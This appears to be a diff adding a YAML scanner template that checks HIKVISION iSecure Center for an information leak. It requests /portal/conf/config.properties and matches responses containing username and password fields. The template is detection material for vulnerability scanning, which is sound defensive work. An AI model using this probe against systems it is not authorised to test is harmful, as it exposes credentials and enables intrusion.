@@ -1,0 +1,26 @@
+id: hikvision-isecure-info-leak
+brief:
+    title: HIKVISION iSecure Center - Information Leak
+    by: adeljck
+    level: high
+    about: HIKVISION iSecure Center comprehensive security management platform is an "integrated" and "intelligent" platform. By accessing equipment such as video surveillance, all-in-one card, parking lot, a...
+    label:
+        - infoleak
+        - iot
+        - hikvision
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/portal/conf/config.properties'
+      signs:
+        - "on": word
+          has:
+            - '@bic'
+            - username
+            - password
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
